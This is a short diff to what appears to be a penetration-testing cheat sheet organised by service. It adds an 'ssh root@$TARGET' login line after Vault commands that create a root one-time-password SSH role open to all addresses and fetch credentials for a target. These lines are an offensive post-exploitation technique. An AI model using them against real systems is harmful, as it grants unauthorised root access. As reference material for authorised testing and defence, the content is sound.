@@ -843,6 +843,7 @@ vault secrets enable ssh
 vault list ssh/roles
 vault write ssh/roles/root default_user=root key_type=otp cidr_list=0.0.0.0/0
 vault write ssh/creds/root ip=$TARGET
+ssh root@$TARGET # key xxxxxxxxx-xxxx-xxxx-xxxxxxxxx
 
 [*] (23) Telnet
 +---------- Spray Service ----------+
